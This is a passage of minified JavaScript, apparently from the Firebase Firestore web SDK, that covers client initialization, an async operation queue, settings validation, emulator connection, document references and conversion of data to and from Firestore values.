cD(this.remoteStore,this.syncEngine.isPrimaryClient))}createEventManager(e){return(function(){return new dD})()}createDatastore(e){const t=um(e.databaseInfo.databaseId),o=GI(e.databaseInfo);return $I(e.authCredentials,e.appCheckCredentials,o,t)}createRemoteStore(e){return(function(o,r,l,c,d){return new XI(o,r,l,c,d)})(this.localStore,this.datastore,e.asyncQueue,(t=>s1(this.syncEngine,t,0)),(function(){return a1.v()?new a1:new BI})())}createSyncEngine(e,t){return(function(r,l,c,d,f,p,v){const y=new bD(r,l,c,d,f,p);return v&&(y.gu=!0),y})(this.localStore,this.remoteStore,this.eventManager,this.sharedClientState,e.initialUser,e.maxConcurrentLimboResolutions,t)}async terminate(){await(async function(t){const o=Ne(t);Ee(Qr,"RemoteStore shutting down."),o.Ea.add(5),await fu(o),o.Aa.shutdown(),o.Va.set("Unknown")})(this.remoteStore),this.datastore?.terminate(),this.eventManager?.terminate()}}Ig.provider={build:()=>new Ig};class C0{constructor(e){this.observer=e,this.muted=!1}next(e){this.muted||this.observer.next&&this.Ou(this.observer.next,e)}error(e){this.muted||(this.observer.error?this.Ou(this.observer.error,e):Zo("Uncaught Error in snapshot listener:",e.toString()))}Nu(){this.muted=!0}Ou(e,t){setTimeout((()=>{this.muted||e(t)}),0)}}const er="FirestoreClient";class DD{constructor(e,t,o,r,l){this.authCredentials=e,this.appCheckCredentials=t,this.asyncQueue=o,this._databaseInfo=r,this.user=yt.UNAUTHENTICATED,this.clientId=ib.newId(),this.authCredentialListener=()=>Promise.resolve(),this.appCheckCredentialListener=()=>Promise.resolve(),this._uninitializedComponentsProvider=l,this.authCredentials.start(o,(async c=>{Ee(er,"Received user=",c.uid),await this.authCredentialListener(c),this.user=c})),this.appCheckCredentials.start(o,(c=>(Ee(er,"Received new app check token=",c),this.appCheckCredentialListener(c,this.user))))}get configuration(){return{asyncQueue:this.asyncQueue,databaseInfo:this._databaseInfo,clientId:this.clientId,authCredentials:this.authCredentials,appCheckCredentials:this.appCheckCredentials,initialUser:this.user,maxConcurrentLimboResolutions:100}}setCredentialChangeListener(e){this.authCredentialListener=e}setAppCheckTokenChangeListener(e){this.appCheckCredentialListener=e}terminate(){this.asyncQueue.enterRestrictedMode();const e=new Qi;return this.asyncQueue.enqueueAndForgetEvenWhileRestricted((async()=>{try{this._onlineComponents&&await this._onlineComponents.terminate(),this._offlineComponents&&await this._offlineComponents.terminate(),this.authCredentials.shutdown(),this.appCheckCredentials.shutdown(),e.resolve()}catch(t){const o=xb(t,"Failed to shutdown persistence");e.reject(o)}})),e.promise}}async function kh(a,e){a.asyncQueue.verifyOperationInProgress(),Ee(er,"Initializing OfflineComponentProvider");const t=a.configuration;await e.initialize(t);let o=t.initialUser;a.setCredentialChangeListener((async r=>{o.isEqual(r)||(await a0(e.localStore,r),o=r)})),e.persistence.setDatabaseDeletedListener((()=>a.terminate())),a._offlineComponents=e}async function c1(a,e){a.asyncQueue.verifyOperationInProgress();const t=await wD(a);Ee(er,"Initializing OnlineComponentProvider"),await e.initialize(t,a.configuration),a.setCredentialChangeListener((o=>n1(e.remoteStore,o))),a.setAppCheckTokenChangeListener(((o,r)=>n1(e.remoteStore,r))),a._onlineComponents=e}async function wD(a){if(!a._offlineComponents)if(a._uninitializedComponentsProvider){Ee(er,"Using user provided OfflineComponentProvider");try{await kh(a,a._uninitializedComponentsProvider._offline)}catch(e){const t=e;if(!(function(r){return r.name==="FirebaseError"?r.code===de.FAILED_PRECONDITION||r.code===de.UNIMPLEMENTED:!(typeof DOMException<"u"&&r instanceof DOMException)||r.code===22||r.code===20||r.code===11})(t))throw t;Jr("Error using user provided cache. Falling back to memory cache: "+t),await kh(a,new kp)}}else Ee(er,"Using default OfflineComponentProvider"),await kh(a,new ID(void 0));return a._offlineComponents}async function A0(a){return a._onlineComponents||(a._uninitializedComponentsProvider?(Ee(er,"Using user provided OnlineComponentProvider"),await c1(a,a._uninitializedComponentsProvider._online)):(Ee(er,"Using default OnlineComponentProvider"),await c1(a,new Ig))),a._onlineComponents}function MD(a){return A0(a).then((e=>e.syncEngine))}async function Dg(a){const e=await A0(a),t=e.eventManager;return t.onListen=vD.bind(null,e.syncEngine),t.onUnlisten=SD.bind(null,e.syncEngine),t.onFirstRemoteStoreListen=yD.bind(null,e.syncEngine),t.onLastRemoteStoreUnlisten=CD.bind(null,e.syncEngine),t}function _D(a,e,t,o){const r=new C0(o),l=new m0(e,r,t);return a.asyncQueue.enqueueAndForget((async()=>d0(await Dg(a),l))),()=>{r.Nu(),a.asyncQueue.enqueueAndForget((async()=>p0(await Dg(a),l)))}}function kD(a,e,t={}){const o=new Qi;return a.asyncQueue.enqueueAndForget((async()=>(function(l,c,d,f,p){const v=new C0({next:S=>{v.Nu(),c.enqueueAndForget((()=>p0(l,y)));const A=S.docs.has(d);!A&&S.fromCache?p.reject(new xe(de.UNAVAILABLE,"Failed to get document because the client is offline.")):A&&S.fromCache&&f&&f.source==="server"?p.reject(new xe(de.UNAVAILABLE,'Failed to get document from server. (However, this document does exist in the local cache. Run again without setting source to "server" to retrieve the cached document.)')):p.resolve(S)},error:S=>p.reject(S)}),y=new m0(om(d.path),v,{includeMetadataChanges:!0,Ka:!0});return d0(l,y)})(await Dg(a),a.asyncQueue,e,t,o))),o.promise}function ND(a,e){const t=new Qi;return a.asyncQueue.enqueueAndForget((async()=>AD(await MD(a),e,t))),t.promise}function T0(a){const e={};return a.timeoutSeconds!==void 0&&(e.timeoutSeconds=a.timeoutSeconds),e}const OD="ComponentProvider",u1=new Map;function zD(a,e,t,o,r){return new i2(a,e,t,r.host,r.ssl,r.experimentalForceLongPolling,r.experimentalAutoDetectLongPolling,T0(r.experimentalLongPollingOptions),r.useFetchStreams,r.isUsingEmulator,o)}const x0="firestore.googleapis.com",d1=!0;class p1{constructor(e){if(e.host===void 0){if(e.ssl!==void 0)throw new xe(de.INVALID_ARGUMENT,"Can't provide ssl option if host option is not set");this.host=x0,this.ssl=d1}else this.host=e.host,this.ssl=e.ssl??d1;if(this.isUsingEmulator=e.emulatorOptions!==void 0,this.credentials=e.credentials,this.ignoreUndefinedProperties=!!e.ignoreUndefinedProperties,this.localCache=e.localCache,e.cacheSizeBytes===void 0)this.cacheSizeBytes=ZT;else{if(e.cacheSizeBytes!==-1&&e.cacheSizeBytes<mI)throw new xe(de.INVALID_ARGUMENT,"cacheSizeBytes must be at least 1048576");this.cacheSizeBytes=e.cacheSizeBytes}WL("experimentalForceLongPolling",e.experimentalForceLongPolling,"experimentalAutoDetectLongPolling",e.experimentalAutoDetectLongPolling),this.experimentalForceLongPolling=!!e.experimentalForceLongPolling,this.experimentalForceLongPolling?this.experimentalAutoDetectLongPolling=!1:e.experimentalAutoDetectLongPolling===void 0?this.experimentalAutoDetectLongPolling=!0:this.experimentalAutoDetectLongPolling=!!e.experimentalAutoDetectLongPolling,this.experimentalLongPollingOptions=T0(e.experimentalLongPollingOptions??{}),(function(o){if(o.timeoutSeconds!==void 0){if(isNaN(o.timeoutSeconds))throw new xe(de.INVALID_ARGUMENT,`invalid long polling timeout: ${o.timeoutSeconds} (must not be NaN)`);if(o.timeoutSeconds<5)throw new xe(de.INVALID_ARGUMENT,`invalid long polling timeout: ${o.timeoutSeconds} (minimum allowed value is 5)`);if(o.timeoutSeconds>30)throw new xe(de.INVALID_ARGUMENT,`invalid long polling timeout: ${o.timeoutSeconds} (maximum allowed value is 30)`)}})(this.experimentalLongPollingOptions),this.useFetchStreams=!!e.useFetchStreams}isEqual(e){return this.host===e.host&&this.ssl===e.ssl&&this.credentials===e.credentials&&this.cacheSizeBytes===e.cacheSizeBytes&&this.experimentalForceLongPolling===e.experimentalForceLongPolling&&this.experimentalAutoDetectLongPolling===e.experimentalAutoDetectLongPolling&&(function(o,r){return o.timeoutSeconds===r.timeoutSeconds})(this.experimentalLongPollingOptions,e.experimentalLongPollingOptions)&&this.ignoreUndefinedProperties===e.ignoreUndefinedProperties&&this.useFetchStreams===e.useFetchStreams}}class Rb{constructor(e,t,o,r){this._authCredentials=e,this._appCheckCredentials=t,this._databaseId=o,this._app=r,this.type="firestore-lite",this._persistenceKey="(lite)",this._settings=new p1({}),this._settingsFrozen=!1,this._emulatorOptions={},this._terminateTask="notTerminated"}get app(){if(!this._app)throw new xe(de.FAILED_PRECONDITION,"Firestore was not initialized using the Firebase SDK. 'app' is not available");return this._app}get _initialized(){return this._settingsFrozen}get _terminated(){return this._terminateTask!=="notTerminated"}_setSettings(e){if(this._settingsFrozen)throw new xe(de.FAILED_PRECONDITION,"Firestore has already been started and its settings can no longer be changed. You can only modify settings before calling any other methods on a Firestore object.");this._settings=new p1(e),this._emulatorOptions=e.emulatorOptions||{},e.credentials!==void 0&&(this._authCredentials=(function(o){if(!o)return new NL;switch(o.type){case"firstParty":return new BL(o.sessionIndex||"0",o.iamToken||null,o.authTokenFactory||null);case"provider":return o.client;default:throw new xe(de.INVALID_ARGUMENT,"makeAuthCredentialsProvider failed due to invalid credential type")}})(e.credentials))}_getSettings(){return this._settings}_getEmulatorOptions(){return this._emulatorOptions}_freezeSettings(){return this._settingsFrozen=!0,this._settings}_delete(){return this._terminateTask==="notTerminated"&&(this._terminateTask=this._terminate()),this._terminateTask}async _restart(){this._terminateTask==="notTerminated"?await this._terminate():this._terminateTask="notTerminated"}toJSON(){return{app:this._app,databaseId:this._databaseId,settings:this._settings}}_terminate(){return(function(t){const o=u1.get(t);o&&(Ee(OD,"Removing Datastore"),u1.delete(t),o.terminate())})(this),Promise.resolve()}}function UD(a,e,t,o={}){a=Wi(a,Rb);const r=cl(e),l=a._getSettings(),c={...l,emulatorOptions:a._getEmulatorOptions()},d=`${e}:${t}`;r&&($A(`https://${d}`),YA("Firestore",!0)),l.host!==x0&&l.host!==d&&Jr("Host has been set in both settings() and connectFirestoreEmulator(), emulator host will be used.");const f={...l,host:d,ssl:r,emulatorOptions:o};if(!Fr(f,c)&&(a._setSettings(f),o.mockUserToken)){let p,v;if(typeof o.mockUserToken=="string")p=o.mockUserToken,v=yt.MOCK_USER;else{p=cR(o.mockUserToken,a._app?.options.projectId);const y=o.mockUserToken.sub||o.mockUserToken.user_id;if(!y)throw new xe(de.INVALID_ARGUMENT,"mockUserToken must contain 'sub' or 'user_id' field!");v=new yt(y)}a._authCredentials=new OL(new dT(p,v))}}class mm{constructor(e,t,o){this.converter=t,this._query=o,this.type="query",this.firestore=e}withConverter(e){return new mm(this.firestore,e,this._query)}}class et{constructor(e,t,o){this.converter=t,this._key=o,this.type="document",this.firestore=e}get _path(){return this._key.path}get id(){return this._key.path.lastSegment()}get path(){return this._key.path.canonicalString()}get parent(){return new tu(this.firestore,this.converter,this._key.path.popLast())}withConverter(e){return new et(this.firestore,e,this._key)}toJSON(){return{type:et._jsonSchemaVersion,referencePath:this._key.toString()}}static fromJSON(e,t,o){if(du(t,et._jsonSchema))return new et(e,o||null,new Le(Da.fromString(t.referencePath)))}}et._jsonSchemaVersion="firestore/documentReference/1.0",et._jsonSchema={type:Ya("string",et._jsonSchemaVersion),referencePath:Ya("string")};class tu extends mm{constructor(e,t,o){super(e,t,om(o)),this._path=o,this.type="collection"}get id(){return this._query.path.lastSegment()}get path(){return this._query.path.canonicalString()}get parent(){const e=this._path.popLast();return e.isEmpty()?null:new et(this.firestore,null,new Le(e))}withConverter(e){return new tu(this.firestore,e,this._path)}}function Np(a,e,...t){if(a=Ot(a),arguments.length===1&&(e=ib.newId()),QL("doc","path",e),a instanceof Rb){const o=Da.fromString(e,...t);return jC(o),new et(a,null,new Le(o))}{if(!(a instanceof et||a instanceof tu))throw new xe(de.INVALID_ARGUMENT,"Expected first argument to doc() to be a CollectionReference, a DocumentReference or FirebaseFirestore");const o=a._path.child(Da.fromString(e,...t));return jC(o),new et(a.firestore,a instanceof tu?a.converter:null,new Le(o))}}const m1="AsyncQueue";class f1{constructor(e=Promise.resolve()){this.Yu=[],this.ec=!1,this.tc=[],this.nc=null,this.rc=!1,this.sc=!1,this.oc=[],this.M_=new n0(this,"async_queue_retry"),this._c=()=>{const o=_h();o&&Ee(m1,"Visibility state changed to "+o.visibilityState),this.M_.w_()},this.ac=e;const t=_h();t&&typeof t.addEventListener=="function"&&t.addEventListener("visibilitychange",this._c)}get isShuttingDown(){return this.ec}enqueueAndForget(e){this.enqueue(e)}enqueueAndForgetEvenWhileRestricted(e){this.uc(),this.cc(e)}enterRestrictedMode(e){if(!this.ec){this.ec=!0,this.sc=e||!1;const t=_h();t&&typeof t.removeEventListener=="function"&&t.removeEventListener("visibilitychange",this._c)}}enqueue(e){if(this.uc(),this.ec)return new Promise((()=>{}));const t=new Qi;return this.cc((()=>this.ec&&this.sc?Promise.resolve():(e().then(t.resolve,t.reject),t.promise))).then((()=>t.promise))}enqueueRetryable(e){this.enqueueAndForget((()=>(this.Yu.push(e),this.lc())))}async lc(){if(this.Yu.length!==0){try{await this.Yu[0](),this.Yu.shift(),this.M_.reset()}catch(e){if(!ml(e))throw e;Ee(m1,"Operation failed with retryable error: "+e)}this.Yu.length>0&&this.M_.p_((()=>this.lc()))}}cc(e){const t=this.ac.then((()=>(this.rc=!0,e().catch((o=>{throw this.nc=o,this.rc=!1,Zo("INTERNAL UNHANDLED ERROR: ",h1(o)),o})).then((o=>(this.rc=!1,o))))));return this.ac=t,t}enqueueAfterDelay(e,t,o){this.uc(),this.oc.indexOf(e)>-1&&(t=0);const r=Tb.createAndSchedule(this,e,t,o,(l=>this.hc(l)));return this.tc.push(r),r}uc(){this.nc&&we(47125,{Pc:h1(this.nc)})}verifyOperationInProgress(){}async Tc(){let e;do e=this.ac,await e;while(e!==this.ac)}Ic(e){for(const t of this.tc)if(t.timerId===e)return!0;return!1}Ec(e){return this.Tc().then((()=>{this.tc.sort(((t,o)=>t.targetTimeMs-o.targetTimeMs));for(const t of this.tc)if(t.skipDelay(),e!=="all"&&t.timerId===e)break;return this.Tc()}))}Rc(e){this.oc.push(e)}hc(e){const t=this.tc.indexOf(e);this.tc.splice(t,1)}}function h1(a){let e=a.message||"";return a.stack&&(e=a.stack.includes(a.message)?a.stack:a.message+`
`+a.stack),e}class nu extends Rb{constructor(e,t,o,r){super(e,t,o,r),this.type="firestore",this._queue=new f1,this._persistenceKey=r?.name||"[DEFAULT]"}async _terminate(){if(this._firestoreClient){const e=this._firestoreClient.terminate();this._queue=new f1(e),this._firestoreClient=void 0,await e}}}function BD(a,e){const t=typeof a=="object"?a:aT(),o=typeof a=="string"?a:Pp,r=nb(t,"firestore").getImmediate({identifier:o});if(!r._initialized){const l=sR("firestore");l&&UD(r,...l)}return r}function Lb(a){if(a._terminated)throw new xe(de.FAILED_PRECONDITION,"The client has already been terminated.");return a._firestoreClient||VD(a),a._firestoreClient}function VD(a){const e=a._freezeSettings(),t=zD(a._databaseId,a._app?.options.appId||"",a._persistenceKey,a._app?.options.apiKey,e);a._componentsProvider||e.localCache?._offlineComponentProvider&&e.localCache?._onlineComponentProvider&&(a._componentsProvider={_offline:e.localCache._offlineComponentProvider,_online:e.localCache._onlineComponentProvider}),a._firestoreClient=new DD(a._authCredentials,a._appCheckCredentials,a._queue,t,a._componentsProvider&&(function(r){const l=r?._online.build();return{_offline:r?._offline.build(l),_online:l}})(a._componentsProvider))}class yn{constructor(e){this._byteString=e}static fromBase64String(e){try{return new yn(ft.fromBase64String(e))}catch(t){throw new xe(de.INVALID_ARGUMENT,"Failed to construct data from Base64 string: "+t)}}static fromUint8Array(e){return new yn(ft.fromUint8Array(e))}toBase64(){return this._byteString.toBase64()}toUint8Array(){return this._byteString.toUint8Array()}toString(){return"Bytes(base64: "+this.toBase64()+")"}isEqual(e){return this._byteString.isEqual(e._byteString)}toJSON(){return{type:yn._jsonSchemaVersion,bytes:this.toBase64()}}static fromJSON(e){if(du(e,yn._jsonSchema))return yn.fromBase64String(e.bytes)}}yn._jsonSchemaVersion="firestore/bytes/1.0",yn._jsonSchema={type:Ya("string",yn._jsonSchemaVersion),bytes:Ya("string")};class j0{constructor(...e){for(let t=0;t<e.length;++t)if(e[t].length===0)throw new xe(de.INVALID_ARGUMENT,"Invalid field name at argument $(i + 1). Field names must not be empty.");this._internalPath=new pt(e)}isEqual(e){return this._internalPath.isEqual(e._internalPath)}}class P0{constructor(e){this._methodName=e}}class vo{constructor(e,t){if(!isFinite(e)||e<-90||e>90)throw new xe(de.INVALID_ARGUMENT,"Latitude must be a number between -90 and 90, but was: "+e);if(!isFinite(t)||t<-180||t>180)throw new xe(de.INVALID_ARGUMENT,"Longitude must be a number between -180 and 180, but was: "+t);this._lat=e,this._long=t}get latitude(){return this._lat}get longitude(){return this._long}isEqual(e){return this._lat===e._lat&&this._long===e._long}_compareTo(e){return Ye(this._lat,e._lat)||Ye(this._long,e._long)}toJSON(){return{latitude:this._lat,longitude:this._long,type:vo._jsonSchemaVersion}}static fromJSON(e){if(du(e,vo._jsonSchema))return new vo(e.latitude,e.longitude)}}vo._jsonSchemaVersion="firestore/geoPoint/1.0",vo._jsonSchema={type:Ya("string",vo._jsonSchemaVersion),latitude:Ya("number"),longitude:Ya("number")};class kn{constructor(e){this._values=(e||[]).map((t=>t))}toArray(){return this._values.map((e=>e))}isEqual(e){return(function(o,r){if(o.length!==r.length)return!1;for(let l=0;l<o.length;++l)if(o[l]!==r[l])return!1;return!0})(this._values,e._values)}toJSON(){return{type:kn._jsonSchemaVersion,vectorValues:this._values}}static fromJSON(e){if(du(e,kn._jsonSchema)){if(Array.isArray(e.vectorValues)&&e.vectorValues.every((t=>typeof t=="number")))return new kn(e.vectorValues);throw new xe(de.INVALID_ARGUMENT,"Expected 'vectorValues' field to be a number array")}}}kn._jsonSchemaVersion="firestore/vectorValue/1.0",kn._jsonSchema={type:Ya("string",kn._jsonSchemaVersion),vectorValues:Ya("object")};const FD=/^__.*__$/;class HD{constructor(e,t,o){this.data=e,this.fieldMask=t,this.fieldTransforms=o}toMutation(e,t){return this.fieldMask!==null?new Zr(e,this.data,this.fieldMask,t,this.fieldTransforms):new pu(e,this.data,t,this.fieldTransforms)}}function q0(a){switch(a){case 0:case 2:case 1:return!0;case 3:case 4:return!1;default:throw we(40011,{dataSource:a})}}class Ib{constructor(e,t,o,r,l,c){this.settings=e,this.databaseId=t,this.serializer=o,this.ignoreUndefinedProperties=r,l===void 0&&this.validatePath(),this.fieldTransforms=l||[],this.fieldMask=c||[]}get path(){return this.settings.path}get dataSource(){return this.settings.dataSource}contextWith(e){return new Ib({...this.settings,...e},this.databaseId,this.serializer,this.ignoreUndefinedProperties,this.fieldTransforms,this.fieldMask)}childContextForField(e){const t=this.path?.child(e),o=this.contextWith({path:t,arrayElement:!1});return o.validatePathSegment(e),o}childContextForFieldPath(e){const t=this.path?.child(e),o=this.contextWith({path:t,arrayElement:!1});return o.validatePath(),o}childContextForArray(e){return this.contextWith({path:void 0,arrayElement:!0})}createError(e){return Op(e,this.settings.methodName,this.settings.hasConverter||!1,this.path,this.settings.targetDoc)}contains(e){return this.fieldMask.find((t=>e.isPrefixOf(t)))!==void 0||this.fieldTransforms.find((t=>e.isPrefixOf(t.field)))!==void 0}validatePath(){if(this.path)for(let e=0;e<this.path.length;e++)this.validatePathSegment(this.path.get(e))}validatePathSegment(e){if(e.length===0)throw this.createError("Document fields must not be empty");if(q0(this.dataSource)&&FD.test(e))throw this.createError('Document fields cannot begin and end with "__"')}}class GD{constructor(e,t,o){this.databaseId=e,this.ignoreUndefinedProperties=t,this.serializer=o||um(e)}createContext(e,t,o,r=!1){return new Ib({dataSource:e,methodName:t,targetDoc:o,path:pt.emptyPath(),arrayElement:!1,hasConverter:r},this.databaseId,this.serializer,this.ignoreUndefinedProperties)}}function JD(a){const e=a._freezeSettings(),t=um(a._databaseId);return new GD(a._databaseId,!!e.ignoreUndefinedProperties,t)}function QD(a,e,t,o,r,l={}){const c=a.createContext(l.merge||l.mergeFields?2:0,e,t,r);D0("Data must be an object, but it was:",c,o);const d=L0(o,c);let f,p;if(l.merge)f=new Mn(c.fieldMask),p=c.fieldTransforms;else if(l.mergeFields){const v=[];for(const y of l.mergeFields){const S=Db(e,y,t);if(!c.contains(S))throw new xe(de.INVALID_ARGUMENT,`Field '${S}' is specified in your field mask but missing from your input data.`);$D(v,S)||v.push(S)}f=new Mn(v),p=c.fieldTransforms.filter((y=>f.covers(y.field)))}else f=null,p=c.fieldTransforms;return new HD(new vn(d),f,p)}function R0(a,e){if(I0(a=Ot(a)))return D0("Unsupported field value:",e,a),L0(a,e);if(a instanceof P0)return(function(o,r){if(!q0(r.dataSource))throw r.createError(`${o._methodName}() can only be used with update() and set()`);if(!r.path)throw r.createError(`${o._methodName}() is not currently supported inside arrays`);const l=o._toFieldTransform(r);l&&r.fieldTransforms.push(l)})(a,e),null;if(a===void 0&&e.ignoreUndefinedProperties)return null;if(e.path&&e.fieldMask.push(e.path),a instanceof Array){if(e.settings.arrayElement&&e.dataSource!==4)throw e.createError("Nested arrays are not supported");return(function(o,r){const l=[];let c=0;for(const d of o){let f=R0(d,r.childContextForArray(c));f==null&&(f={nullValue:"NULL_VALUE"}),l.push(f),c++}return{arrayValue:{values:l}}})(a,e)}return(function(o,r){if((o=Ot(o))===null)return{nullValue:"NULL_VALUE"};if(typeof o=="number")return I2(r.serializer,o);if(typeof o=="boolean")return{booleanValue:o};if(typeof o=="string")return{stringValue:o};if(o instanceof Date){const l=Pa.fromDate(o);return{timestampValue:wp(r.serializer,l)}}if(o instanceof Pa){const l=new Pa(o.seconds,1e3*Math.floor(o.nanoseconds/1e3));return{timestampValue:wp(r.serializer,l)}}if(o instanceof vo)return{geoPointValue:{latitude:o.latitude,longitude:o.longitude}};if(o instanceof yn)return{bytesValue:GT(r.serializer,o._byteString)};if(o instanceof et){const l=r.databaseId,c=o.firestore._databaseId;if(!c.isEqual(l))throw r.createError(`Document reference is for database ${c.projectId}/${c.database} but should be for database ${l.projectId}/${l.database}`);return{referenceValue:hb(o.firestore._databaseId||r.databaseId,o._key.path)}}if(o instanceof kn)return(function(c,d){const f=c instanceof kn?c.toArray():c;return{mapValue:{fields:{[ET]:{stringValue:ST},[qp]:{arrayValue:{values:f.map((v=>{if(typeof v!="number")throw d.createError("VectorValues must only contain numeric values.");return pb(d.serializer,v)}))}}}}}})(o,r);if(XT(o))return o._toProto(r.serializer);throw r.createError(`Unsupported field value: ${rb(o)}`)})(a,e)}function L0(a,e){const t={};return fT(a)?e.path&&e.path.length>0&&e.fieldMask.push(e.path):Yr(a,((o,r)=>{const l=R0(r,e.childContextForField(o));l!=null&&(t[o]=l)})),{mapValue:{fields:t}}}function I0(a){return!(typeof a!="object"||a===null||a instanceof Array||a instanceof Date||a instanceof Pa||a instanceof vo||a instanceof yn||a instanceof et||a instanceof P0||a instanceof kn||XT(a))}function D0(a,e,t){if(!I0(t)||!pT(t)){const o=rb(t);throw o==="an object"?e.createError(a+" a custom object"):e.createError(a+" "+o)}}function Db(a,e,t){if((e=Ot(e))instanceof j0)return e._internalPath;if(typeof e=="string")return KD(a,e);throw Op("Field path arguments must be of type string or ",a,!1,void 0,t)}const WD=new RegExp("[~\\*/\\[\\]]");function KD(a,e,t){if(e.search(WD)>=0)throw Op(`Invalid field path (${e}). Paths must not contain '~', '*', '/', '[', or ']'`,a,!1,void 0,t);try{return new j0(...e.split("."))._internalPath}catch{throw Op(`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`,a,!1,void 0,t)}}function Op(a,e,t,o,r){const l=o&&!o.isEmpty(),c=r!==void 0;let d=`Function ${e}() called with invalid data`;t&&(d+=" (via `toFirestore()`)"),d+=". ";let f="";return(l||c)&&(f+=" (found",l&&(f+=` in field ${o}`),c&&(f+=` in document ${r}`),f+=")"),new xe(de.INVALID_ARGUMENT,d+a+f)}function $D(a,e){return a.some((t=>t.isEqual(e)))}class YD{convertValue(e,t="none"){switch(Xi(e)){case 0:return null;case 1:return e.booleanValue;case 2:return za(e.integerValue||e.doubleValue);case 3:return this.convertTimestamp(e.timestampValue);case 4:return this.convertServerTimestamp(e,t);case 5:return e.stringValue;case 6:return this.convertBytes(Yi(e.bytesValue));case 7:return this.convertReference(e.referenceValue);case 8:return this.convertGeoPoint(e.geoPointValue);case 9:return this.convertArray(e.arrayValue,t);case 11:return this.convertObject(e.mapValue,t);case 10:return this.convertVectorValue(e.mapValue);default:throw we(62114,{value:e})}}convertObject(e,t){return this.convertObjectMap(e.fields,t)}convertObjectMap(e,t="none"){const o={};return Yr(e,((r,l)=>{o[r]=this.convertValue(l,t)})),o}convertVectorValue(e){const t=e.fields?.[qp].arrayValue?.values?.map((o=>za(o.doubleValue)));return new kn(t)}convertGeoPoint(e){return new vo(za(e.latitude),za(e.longitude))}convertArray(e,t){return(e.values||[]).map((o=>this.convertValue(o,t)))}convertServerTimestamp(e,t){switch(t){case"previous":const o=tm(e);return o==null?null:this.convertValue(o,t);case"estimate":return this.convertTimestamp(Yc(e));default:return null}}convertTimestamp(e){const t=$i(e);return new Pa(t.seconds,t.nanos)}convertDocumentKey(e,t){const o=Da.fromString(e);ma(YT(o),9688,{name:e});const r=new Xc(o.get(1),o.get(3)),l=new Le(o.popFirst(5));return r.isEqual(t)||Zo(`Document ${l} contains a document reference within a different database (${r.projectId}/${r.database}) which is not supported. It will be treated as a reference in the current database (${t.projectId}/${t.database}) instead.`),l}}class w0 extends YD{constructor(e){super(),this.firestore=e}convertBytes(e){return new yn(e)}convertReference(e){const t=this.convertDocumentKey(e,this.firestore._databaseId);return new et(this.firestore,null,t)}}const g1="@firebase/firestore",b1="4.11.0";function v1(a){return(function(t,o){if(typeof t!="object"||t===null)return!1;const r=t;for(const l of o)if(l in r&&typeof r[l]=="function")return!0;return!1})(a,["next","error","complete"])}class M0{constructor(e,t,o,r,l){this._firestore=e,this._userDataWriter=t,this._key=o,this._document=r,this._converter=l}get id(){return this._key.path.lastSegment()}get ref(){return new et(this._firestore,this._converter,this._key)}exists(){return this._document!==null}data(){if(this._document){if(this._converter){const e=new XD(this._firestore,this._userDataWriter,this._key,this._document,null);return this._converter.fromFirestore(e)}return this._userDataWriter.convertValue(this._document.data.value)}}_fieldsProto(){return this._document?.data.clone().value.mapValue.fields??void 0}get(e){if(this._document){const t=this._document.data.field(Db("DocumentSnapshot.get",e));if(t!==null)return this._userDataWriter.convertValue(t)}}}class XD extends M0{data(){return super.data()}}function ZD(a){if(a.limitType==="L"&&a.explicitOrderBy.length===0)throw new xe(de.UNIMPLEMENTED,"limitToLast() queries require specifying at least one orderBy() clause")}function ew(a,e,t){let o;return o=a?t&&(t.merge||t.mergeFields)?a.toFirestore(e,t):a.toFirestore(e):e,o}class Oc{constructor(e,t){this.hasPendingWrites=e,this.fromCache=t}isEqual(e){return this.hasPendingWrites===e.hasPendingWrites&&this.fromCache===e.fromCache}}class Vr extends M0{constructor(e,t,o,r,l,c){super(e,t,o,r,c),this._firestore=e,this._firestoreImpl=e,this.metadata=l}exists(){return super.exists()}data(e={}){if(this._document){if(this._converter){const t=new hp(this._firestore,this._userDataWriter,this._key,this._document,this.metadata,null);return this._converter.fromFirestore(t,e)}return this._userDataWriter.convertValue(this._document.data.value,e.serverTimestamps)}}get(e,t={}){if(this._document){const o=this._document.data.field(Db("DocumentSnapshot.get",e));if(o!==null)return this._userDataWriter.convertValue(o,t.serverTimestamps)}}toJSON(){if(this.metadata.hasPendingWrites)throw new xe(de.FAILED_PRECONDITION,"DocumentSnapshot.toJSON() attempted to serialize a document with pending writes. Await waitForPendingWrites() before invoking toJSON().");const e=this._document,t={};return t.type=Vr._jsonSchemaVersion,t.bundle="",t.bundleSource="DocumentSnapshot",t.bundleName=this._key.toString(),!e||!e.isValidDocument()||!e.isFoundDocument()?t:(this._userDataWriter.convertObjectMap(e.data.value.mapValue.fields,"previous"),t.bundle=(this._firestore,this.ref.path,"NOT SUPPORTED"),t)}}Vr._jsonSchemaVersion="firestore/documentSnapshot/1.0",Vr._jsonSchema={type:Ya("string",Vr._jsonSchemaVersion),bundleSource:Ya("string","DocumentSnapshot"),bundleName:Ya("string"),bundle:Ya("string")};class hp extends Vr{data(e={}){return super.data(e)}}class Ys{constructor(e,t,o,r){this._firestore=e,this._userDataWriter=t,this._snapshot=r,this.metadata=new Oc(r.hasPendingWrites,r.fromCache),this.query=o}get docs(){const e=[];return this.forEach((t=>e.push(t))),e}get size(){return this._snapshot.docs.size}get empty(){return this.size===0}forEach(e,t){this._snapshot.docs.forEach((o=>{e.call(t,new hp(this._firestore,this._userDataWriter,o.key,o,new Oc(this._snapshot.mutatedKeys.has(o.key),this._snapshot.fromCache),this.query.converter))}))}docChanges(e={}){const t=!!e.includeMetadataChanges;if(t&&this._snapshot.excludesMetadataChanges)throw new xe(de.INVALID_ARGUMENT,"To include metadata changes with your document changes, you must also pass { includeMetadataChanges:true } to onSnapshot().");return this._cachedChanges&&this._cachedChangesIncludeMetadataChanges===t||(this._cachedChanges=(function(r,l){if(r._snapshot.oldDocs.isEmpty()){let c=0;return r._snapshot.docChanges.map((d=>{const f=new hp(r._firestore,r._userDataWriter,d.doc.key,d.doc,new Oc(r._snapshot.mutatedKeys.has(d.doc.key),r._snapshot.fromCache),r.query.converter);return d.doc,{type:"added",doc:f,oldIndex:-1,newIndex:c++}}))}{let c=r._snapshot.oldDocs;return r._snapshot.docChanges.filter((d=>l||d.type!==3)).map((d=>{const f=new hp(r._firestore,r._userDataWriter,d.doc.key,d.doc,new Oc(r._snapshot.mutatedKeys.has(d.doc.key),r._snapshot.fromCache),r.query.converter);let p=-1,v=-1;return 